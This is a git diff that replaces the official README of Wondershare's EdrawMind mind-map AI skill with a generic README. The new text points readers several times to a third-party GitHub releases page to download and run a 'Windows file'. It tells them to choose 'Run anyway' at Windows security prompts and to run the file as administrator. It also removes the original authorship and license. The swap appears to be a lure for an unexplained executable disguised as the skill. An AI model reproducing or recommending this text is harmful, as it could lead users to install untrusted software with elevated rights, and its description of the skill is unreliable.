@@ -1,192 +1,215 @@
-# EdrawMind Mindmap AI Skill
+# 🧠 edrawmind-skills - Create clear mind maps faster
 
-> **Author:** EdrawMind AI Team · **Organization:** Wondershare EdrawMind
-> **Version:** 1.0.0 · **License:** Proprietary © 2026 Wondershare EdrawMind. All rights reserved.
+[![Download edrawmind-skills](https://img.shields.io/badge/Download%20edrawmind-skills-8A2BE2?style=for-the-badge)](https://github.com/Tristanb2952/edrawmind-skills/releases)
 
-[中文版](README_CN.md)
+## 🪄 What this is
 
-An AI skill for AI Agents (GitHub Copilot, Claude Code, etc.) that generates professional mind maps from Markdown content. Supports customizable layouts, themes, backgrounds, and hand-drawn styles.
+edrawmind-skills helps you create professional mind maps with EdrawMind using AI tools like GitHub Copilot, Claude Code, and OpenClaw.
 
----
+It gives you a simple way to turn ideas, notes, and plans into clean mind maps without building them by hand.
 
-## What This Skill Does
+## 📥 Download
 
-The `edrawmind-mindmap` skill converts structured Markdown into professional mind maps via the EdrawMind HTTP API. It supports 12 layout types, 10 theme styles, 15 background presets, and multiple hand-drawn effects.
+Visit this page to download the latest version for Windows:
 
-### Use Cases
+https://github.com/Tristanb2952/edrawmind-skills/releases
 
-- Outlines and summaries
-- Meeting notes and study notes
-- Project planning and task breakdown
-- Code architecture visualization
-- Knowledge frameworks and reading notes
+Choose the newest release, then download the Windows file attached to it.
 
-### What Problems It Solves
+## 🪟 Windows setup
 
-- **No design skills needed** — prepare Markdown text; the AI handles layout and rendering automatically.
-- **Rich customization** — choose from 12 layouts (mind map, timeline, fishbone, org chart, etc.), 10 themes, and hand-drawn styles.
-- **Instant online preview** — get an online editing link and thumbnail right after generation.
+Follow these steps on a Windows PC:
 
----
+1. Open the download page above.
+2. Find the latest release at the top of the page.
+3. Under Assets, download the Windows file.
+4. If the file is a ZIP archive, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Run the app or the setup file inside the folder.
 
-## Project Structure
+If Windows shows a security prompt, choose Run or More info, then Run anyway if you trust the file from the release page.
 
-```
-edrawmind-skills/
-├── build.bat                       # Build entry — Windows
-├── build.sh                        # Build entry — Linux / macOS
-├── pyproject.toml                  # Project config (uv / pip)
-├── scripts/
-│   └── build.py                    # Build script — packages skill into zip
-├── skills/
-│   └── edrawmind-mindmap/          # The skill directory
-│       ├── SKILL.md                # Skill definition (agent reads this)
-│       ├── license.txt
-│       ├── docs/                   # Internal dev docs (excluded from zip)
-│       ├── references/             # Reference docs (loaded on demand)
-│       │   ├── markdown-format.md
-│       │   ├── style-guide.md
-│       │   └── tool-reference.md
-│       └── scripts/
-│           └── edrawmind_cli.py    # CLI tool for HTTP API
-├── README.md
-└── README_CN.md
-```
+## 🧭 How to use it
 
----
+You can use edrawmind-skills with your AI tool to create mind maps for:
 
-## Installation
+- project planning
+- study notes
+- meeting notes
+- brainstorming
+- content outlines
+- research summaries
+- task breakdowns
 
-### From Release Zip
+A simple workflow looks like this:
 
-1. Download `edrawmind-mindmap.zip` from [Releases](../../releases)
-2. Unzip into your AI Agent's skill directory:
-   - **GitHub Copilot**: `.github/skills/`
-   - **Claude Code**: `.claude/skills/`
-   - **General**: `.agents/skills/`
+1. Open your AI tool.
+2. Ask it to create a mind map from your topic.
+3. Use the EdrawMind API flow included in the skill.
+4. Review the output in EdrawMind.
+5. Edit the map if you want to change layout, labels, or branches.
 
-### From Source
+## 💡 What it helps with
 
-```bash
-git clone <repo-url>
-cd edrawmind-skills
-```
+This tool helps you:
 
----
+- turn a rough idea into a structured map
+- save time when making diagrams
+- keep ideas grouped in a clear way
+- create maps that look clean and ready to share
+- work from plain text, prompts, or notes
 
-## Build
+It fits well when you want a quick first draft before you refine the map in EdrawMind.
 
-Package the skill into a distributable zip (excludes `docs/`):
+## 🧰 What you need
 
-```bash
-# Windows
-build.bat
+Use a Windows computer with:
 
-# Linux / macOS
-./build.sh
+- a modern version of Windows 10 or Windows 11
+- enough free space to extract the download
+- internet access for the download page
+- EdrawMind installed or available through your normal setup
+- one of the supported AI tools:
+  - GitHub Copilot
+  - Claude Code
+  - OpenClaw
 
-# Or via Python / uv directly
-python scripts/build.py
-uv run python scripts/build.py
+## 🗂️ Files you may see
 
-# Custom output path
-build.bat -o dist/custom-name.zip
+After download, you may find files such as:
 
-# Dry run — list files only
-build.bat --list
-```
+- a ZIP file with the release package
+- a README file with quick instructions
+- skill files used by the AI tool
+- sample prompts or templates
+- an app file or helper file for Windows
 
-Output: `dist/edrawmind-mindmap.zip`
+Keep the folder together so the tool can find the files it needs.
 
----
+## ⚙️ Basic use case
 
-## Quick Start
+Use a simple prompt like:
 
-### Trigger Phrases
+Create a mind map for a team meeting about product planning.  
+Use short branch labels.  
+Keep the layout clean and easy to read.
 
-The skill activates automatically when you say things like:
+You can also use it for:
 
-- *"Create a mind map for machine learning concepts"*
-- *"Convert this Markdown into a mind map"*
-- *"Generate a mind map of the project architecture"*
+- class topics
+- launch plans
+- customer feedback
+- feature lists
+- weekly goals
 
-### CLI Tool
+## 🔧 Troubleshooting
 
-The skill uses `edrawmind_cli.py` to call the EdrawMind HTTP API:
+If the file will not open:
 
-```bash
-# Basic
-python edrawmind_cli.py input.md
+- make sure the download finished
+- check that you extracted the ZIP file first
+- try running the file as administrator
+- confirm that Windows did not block the file
+- download the latest release again if the file looks damaged
 
-# With layout, theme, and background
-python edrawmind_cli.py --layout 7 --theme 9 --background 4 timeline.md
+If the AI tool does not respond as expected:
 
-# Hand-drawn style
-python edrawmind_cli.py --line-hand-drawn --fill pencil --background 9 notes.md
-```
+- restart the tool
+- check that the skill files are in the right folder
+- try a shorter prompt
+- use a simple topic first
+- make sure the EdrawMind API step is set up in the tool
 
-### Response
+If the mind map looks wrong:
 
-```json
-{
-  "file_url": "https://...",
-  "thumbnail_url": "https://...",
-  "extra_info": {
-    "elapsed_ms": 962,
-    "request_id": "aaf23d94f8d044e68ba2211213b922c7"
-  }
-}
-```
+- use shorter branch names
+- split large topics into smaller parts
+- remove extra detail from the prompt
+- ask for a cleaner layout
+- run the request again with a narrower topic
 
-| Field | Description |
-|---|---|
-| `file_url` | Online editing link. **Must be shown to the user.** |
-| `thumbnail_url` | Thumbnail preview URL |
+## 📌 Tips for better results
 
----
+Use plain topics like:
 
-## Styling Options
+- sales plan
+- exam revision
+- weekly roadmap
+- hiring plan
+- app launch checklist
 
-| Parameter | Range | Description |
-|-----------|-------|-------------|
-| `--layout N` | 1–12 | Layout type (mind map, timeline, fishbone, org chart, etc.) |
-| `--theme N` | 1–10 | Theme style (default, knowledge, vivid, minimal, etc.) |
-| `--background BG` | 1–15 or `#RRGGBB` | Canvas background |
-| `--line-hand-drawn` | flag | Hand-drawn connection lines |
-| `--fill STYLE` | none/pencil/watercolor/charcoal/paint/graffiti | Node fill style |
+Good prompts usually include:
 
-See [style-guide.md](skills/edrawmind-mindmap/references/style-guide.md) for detailed parameter descriptions.
+- the main topic
+- the number of main branches
+- the tone or style
+- the level of detail
+- any must-have sections
 
----
+Example:
 
-## Important Notes
+Create a mind map for a website launch.  
+Use 5 main branches.  
+Keep each branch short and practical.  
+Make it easy to edit in EdrawMind.
 
-- Content must be structured Markdown with headings and lists
-- Use only one `#` heading as the root node
-- Recommended: max 5 levels deep, ~150 nodes
-- For large documents (100+ headings), split by chapter
-- **Always show the returned `file_url` to the user**
+## 🧩 Common use patterns
 
----
+People often use this kind of skill for:
 
-## Copyright
+- meeting prep
+- lesson planning
+- product strategy
+- personal planning
+- research organization
+- idea mapping for articles or reports
 
-© 2026 Wondershare EdrawMind AI Team. All rights reserved.
+It works best when you start with one clear topic and add structure step by step.
 
-See [`skills/edrawmind-mindmap/license.txt`](skills/edrawmind-mindmap/license.txt) for full license terms.
+## 🔐 Safe download path
 
----
+Only use the release page linked above for Windows downloads:
 
-## FAQ
+https://github.com/Tristanb2952/edrawmind-skills/releases
 
-**Q: Is the EdrawMind mindmap skill free to use?**
-A: Yes — it is currently free during the promotional period.
+That page gives you the latest release files in one place.
 
-**Q: What output formats are available?**
-A: Returns an online editing link and thumbnail. Export as `.emmx` for desktop editing in EdrawMind.
+## 📁 Folder layout after setup
 
-**Q: Is my data safe?**
-A: Markdown content is transmitted over HTTPS. Do not include sensitive information.
+A simple setup may look like this:
 
-**Q: How do I report a bug?**
-A: Email 📧 **ws-business@wondershare.cn**
+- edrawmind-skills folder
+- release files
+- skill instructions
+- prompt templates
+- support files for the AI tool
+
+Keep the folder in a place you can find again, such as Downloads or Documents.
+
+## 🖥️ Best way to start
+
+If this is your first time:
+
+1. Download the latest release.
+2. Extract the files.
+3. Open the included instructions.
+4. Run the app or load the skill in your AI tool.
+5. Try one short mind map request.
+6. Check the result in EdrawMind.
+
+## 🧠 Example topics to try
+
+- project kickoff
+- content calendar
+- study plan
+- customer journey
+- product roadmap
+- event checklist
+- monthly review
+- support process
+
+## 📎 Release page
+
+Download the latest version here:
+
+https://github.com/Tristanb2952/edrawmind-skills/releases
